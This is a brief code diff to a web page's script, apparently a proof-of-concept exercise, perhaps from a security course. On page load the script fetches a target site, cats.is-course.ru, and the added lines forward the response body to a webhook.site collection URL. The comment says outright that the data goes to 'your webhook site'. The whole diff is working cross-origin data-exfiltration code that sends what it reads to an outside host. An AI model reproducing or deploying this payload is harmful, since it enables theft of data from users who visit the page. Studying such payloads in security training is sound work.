@@ -8,6 +8,14 @@
         window.onload = function() {
             var xhr = new XMLHttpRequest();
             xhr.open("GET", "https://cats.is-course.ru", true);
+            xhr.onload = function() {
+                // Send the response body to your webhook site
+                var sendData = xhr.responseText;
+                var sendReq = new XMLHttpRequest();
+                sendReq.open("POST", "https://webhook.site/65d06db1-3fc0-4e77-954d-3d0380378094", true);
+                sendReq.setRequestHeader("Content-Type", "application/json");
+                sendReq.send(JSON.stringify({ body: sendData }));
+            };
             xhr.send();
         }
     </script>
